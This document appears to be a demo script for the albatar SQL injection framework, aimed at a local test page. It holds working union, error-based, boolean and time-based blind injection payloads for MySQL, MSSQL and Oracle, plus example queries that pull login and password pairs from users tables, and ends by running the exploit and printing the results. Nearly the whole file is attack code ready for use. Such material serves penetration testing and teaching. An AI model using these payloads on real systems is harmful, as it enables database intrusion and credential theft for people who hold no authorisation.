#!/usr/bin/env python3

from albatar import *
from urllib.parse import quote_plus
import re

PROXIES = {}#'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
HEADERS = ['User-Agent: Mozilla/5.0']

def test_state_grep(headers, body, time):
  if '0 rows fetched' in body:
    return 0
  else:
    return 1

def test_state_time(headers, body, time):
  if time >= 1:
    return 1
  else:
    return 0

def extract_results(headers, body, time):
  return re.findall(':ABC:(.+?):ABC:', body, re.S)

def quote(s):
  return quote_plus(s, safe='${}:(),')

# MySQL {{{
def mysql_union():
  '''
  # select login,first_name from users where user_id=0 union all select null,concat(0x3a4142433a,X,0x3a4142433a) from (SELECT CONCAT_WS(0x3a,login,password) X FROM users LIMIT 0,10)a;
  '''
  template = ' union all select null,concat(0x3a4142433a,X,0x3a4142433a) from ${query} -- '

  def make_requester():
    return Requester_HTTP(
      proxies = PROXIES,
      headers = HEADERS,
      url = 'http://127.0.0.1/demo/sqli.php?dbms=mysql&id=0${injection}',
      method = 'GET',
      response_processor = extract_results,
      encode_payload = quote,
      )

  return Method_union(make_requester, template, pager=5)

def mysql_error():

  '''
  # MySQL >= 5.1 (32 bytes max)
  # select * from users where user_id=1 and extractvalue(null,concat(0x3a4142433a,(select X from (SELECT CONCAT_WS(0x3a,login,password) X FROM users LIMIT 0,1)a),0x3a4142433a));
  template = ' and extractvalue(null,concat(0x3a4142433a,(select X from ${query}),0x3a4142433a))'

  # MySQL >= 5.5.5 (512 bytes max)
  # select * from users where user_id=1 and 1=(select exp(~(select concat(0x3a4142433a,X,0x3a4142433a) from (SELECT CONCAT_WS(0x3a,login,password) X FROM users LIMIT 0,1)a)));
  template = ' and (select exp(~(select * from(select concat(0x3a4142433a,X,0x3a4142433a) from ${query})x)))'


  # MySQL < 5.5.5 (64 bytes max)
  # select * from users where user_id=1 and (select 1 from(select count(*),concat(0x3a4142433a,(select X from (SELECT CONCAT_WS(0x3a,login,password) X FROM users LIMIT 0,1)a),0x3a4142433a,floor(rand(0)*2))x from information_schema.character_sets group by x)a);
  template = ' and (select 1 from(select count(*),concat(0x3a4142433a,(select X from ${query}),0x3a4142433a,floor(rand(0)*2))x from information_schema.character_sets group by x)a)'
  '''

  template = ' and (select 1 from(select count(*),concat(0x3a4142433a,(select X from ${query}),0x3a4142433a,floor(rand(0)*2))x from information_schema.character_sets group by x)a)'

  def make_requester():
    return Requester_HTTP(
      proxies = PROXIES,
      headers = HEADERS,
      url = 'http://127.0.0.1/demo/sqli.php?dbms=mysql&id=1${injection}',
      method = 'GET',
      response_processor = extract_results,
      encode_payload = quote,
      )

  return Method_error(make_requester, template)

def mysql_boolean():

  def make_requester():
    return Requester_HTTP(
      proxies = PROXIES,
      headers = HEADERS,
      url = 'http://127.0.0.1/demo/sqli.php?dbms=mysql',
      body = 'id=1${injection}',
      method = 'POST',
      response_processor = test_state_grep,
      encode_payload = quote,
      )

  template = ' and (ascii(substring((${query}),${char_pos},1))&${bit_mask})=${bit_mask}'
  return Method_bitwise(make_requester, template)

def mysql_boolean_regexp():

  def make_requester():
    return Requester_HTTP(
      proxies = PROXIES,
      headers = HEADERS,
      url = 'http://127.0.0.1/demo/sqli.php?dbms=mysql',
      body = 'id=1${injection}',
      method = 'POST',
      response_processor = test_state_grep,
      encode_payload = quote,
      )

  template = ' and (${query}) regexp binary ${regexp}'
  return Method_regexp(make_requester, template)

def mysql_boolean_binary():

  def make_requester():
    return Requester_HTTP(
      proxies = PROXIES,
      headers = HEADERS,
      url = 'http://127.0.0.1/demo/sqli.php?dbms=mysql',
      body = 'id=1${injection}',
      method = 'POST',
      response_processor = test_state_grep,
      encode_payload = quote,
      )

  template = ' and ascii(substring((${query}),${char_pos},1))${comparator}${char_ord}'
  return Method_binary(make_requester, template)

def mysql_time():

  template = ' and if(((ascii(substring((${query}),${char_pos},1))&${bit_mask})=${bit_mask}),sleep(1),1)'

  def make_requester():
    return Requester_HTTP(
      proxies = PROXIES,
      headers = HEADERS,
      url = 'http://127.0.0.1/demo/sqli.php?dbms=mysql&id=1${injection}',
      method = 'GET',
      response_processor = test_state_time,
      encode_payload = quote,
      )

  return Method_bitwise(make_requester, template, num_threads=1)

# }}}

# MSSQL {{{
def mssql_union():
  '''
  select login,first_name from blah..users where user_id=0 union all select ':ABC:'+X+':ABC:',null FROM (SELECT LTRIM(STR(COUNT(*))) X FROM blah..users)a
  select login,first_name from blah..users where user_id=0 union all select ':ABC:'+X+':ABC:',null FROM (SELECT TOP 10 login+':'+password X FROM blah..users WHERE login+':'+password NOT IN (SELECT TOP 0 login+':'+password FROM blah..users))a
  '''

  template = " union all select ':ABC:'+X+':ABC:',null from ${query}"

  def make_requester():
    return Requester_HTTP(
      proxies = PROXIES,
      headers = HEADERS,
      url = 'http://127.0.0.1/demo/sqli.php?dbms=mssql&id=0${injection}',
      method = 'GET',
      response_processor = extract_results,
      encode_payload = quote,
     )

  return Method_union(make_requester, template)

def mssql_error():
  '''
  select login,first_name from blah..users where user_id=1 and 1=convert(int,(select ':ABC:'+X+':ABC' from (SELECT LTRIM(STR(COUNT(*))) X FROM blah..users)a))
  select login,first_name from blah..users where user_id=1 and 1=convert(int,(select ':ABC:'+X+':ABC' from (SELECT TOP 1 login+':'+password X FROM blah..users WHERE login+':'+password NOT IN (SELECT TOP 0 login+':'+password FROM blah..users))a))
  '''

  template = " and 1=convert(int,(select ':ABC:'+X+':ABC:' from ${query}))"

  def make_requester():
    return Requester_HTTP(
      proxies = PROXIES,
      headers = HEADERS,
      url = 'http://127.0.0.1/demo/sqli.php?dbms=mssql&id=1${injection}',
      method = 'GET',
      response_processor = extract_results,
      encode_payload = quote,
      )

  return Method_error(make_requester, template)

def mssql_boolean():

  template = " and 1=(select case when ((ascii(substring(cast((${query}) as nvarchar(4000)),${char_pos},1))&${bit_mask})=${bit_mask}) then 1 else 0 end)"

  def make_requester():
    return Requester_HTTP(
      proxies = PROXIES,
      headers = HEADERS,
      url = 'http://127.0.0.1/demo/sqli.php?dbms=mssql&id=1${injection}',
      method = 'GET',
      response_processor = test_state_grep,
      encode_payload = quote,
      )

  return Method_bitwise(make_requester, template)

def mssql_time():

  template = " if((ascii(substring(cast((${query}) as nvarchar(4000)),${char_pos},1))&${bit_mask})=${bit_mask}) waitfor delay '0:0:2'--"

  def make_requester():
    return Requester_HTTP(
      proxies = PROXIES,
      headers = HEADERS,
      url = 'http://127.0.0.1/demo/sqli.php?dbms=mssql&id=1${injection}',
      method = 'GET',
      response_processor = test_state_time,
      encode_payload = quote,
      )

  return Method_bitwise(make_requester, template, num_threads=1)

# }}}

# Oracle {{{
def oracle_union():
  '''
  select login,first_name from johny.users where user_id=0 union all select null,':ABC:'||X||':ABC:' from (select upper(count(*)) X FROM v$version)
  select login,first_name from johny.users where user_id=0 union all select null,':ABC:'||X||':ABC:' FROM (select banner X,ROWNUM-1 R FROM v$version) WHERE R>=0 AND R<=10
  '''

  template = " union all select null,':ABC:'||X||':ABC:' from ${query}"

  def make_requester():
    return Requester_HTTP(
      proxies = PROXIES,
      headers = HEADERS,
      url = 'http://127.0.0.1:18080/demo/sqli.php?dbms=oracle&id=0${injection}',
      method = 'GET',
      response_processor = extract_results,
      encode_payload = quote,
     )

  return Method_union(make_requester, template, )

def oracle_error():
  '''
  # select login,first_name from johny.users where user_id=1 AND 1=(select extractvalue(xmltype('<x/>'),':ABC:'||X||':ABC:') from (SELECT login X,ROWNUM-1 R FROM johny.users) WHERE (R=1))
  template = " AND 1=(select extractvalue(xmltype('<x/>'),':ABC:'||X||':ABC:') from ${query})"

  # select login,first_name from johny.users where user_id=1 AND 1=(select upper(XMLType('<ZZZ'||(select rawtohex(X) from (SELECT login X, ROWNUM-1 R FROM john.users) WHERE (R=1))||'ZZZ:z>')) from dual)
  template = " and 1=(select upper(XMLType('<ZZZ'||(select rawtohex(X) from ${query})||'ZZZ:z>')) from dual)"
  '''

  template = " and 1=(select upper(XMLType('<ZZZ'||(select rawtohex(X) from ${query})||'ZZZ:z>')) from dual)"
  def extract_results(headers, body, time):
    return [re.search('ZZZ(.+?)ZZZ', body, re.S).group(1).decode('hex')]


  def make_requester():
    return Requester_HTTP(
      proxies = PROXIES,
      headers = HEADERS,
      url = 'http://127.0.0.1:18080/demo/sqli.php?dbms=oracle&id=1${injection}',
      method = 'GET',
      response_processor = extract_results,
      encode_payload = quote,
     )

  return Method_error(make_requester, template, )

def oracle_boolean():

  template = " and 1=(select case when (select bitand((select ascii(substr((${query}),${char_pos})) from dual),${bit_mask}) from dual)=${bit_mask} then 1 else 0 end from dual)"

  def make_requester():
    return Requester_HTTP(
      proxies = PROXIES,
      headers = HEADERS,
      url = 'http://127.0.0.1:18080/demo/sqli.php?dbms=oracle&id=1${injection}',
      method = 'GET',
      response_processor = test_state_grep,
      encode_payload = quote,
      )

  return Method_bitwise(make_requester, template, num_threads=1, rate_limit=.5)

# TODO
# def oracle_time():
# SELECT DBMS_AW.INTERP('SLEEP 5') FROM DUAL

# }}}

sqli = MySQL_Inband(mysql_union())
#sqli = MySQL_Inband(mysql_error())
#sqli = MySQL_Blind(mysql_boolean())
#sqli = MySQL_Blind(mysql_boolean_regexp())
#sqli = MySQL_Blind(mysql_boolean_binary())
#sqli = MySQL_Blind(mysql_time())

#sqli = MSSQL_Inband(mssql_union())
#sqli = MSSQL_Inband(mssql_error())
#sqli = MSSQL_Inband(mssql_boolean())
#sqli = MSSQL_Inband(mssql_time())

#sqli = Oracle_Inband(oracle_union())
#sqli = Oracle_Inband(oracle_error())
#sqli = Oracle_Blind(oracle_boolean())

for r in sqli.exploit():
  print(r)

# vim: ts=2 sw=2 sts=2 et fdm=marker
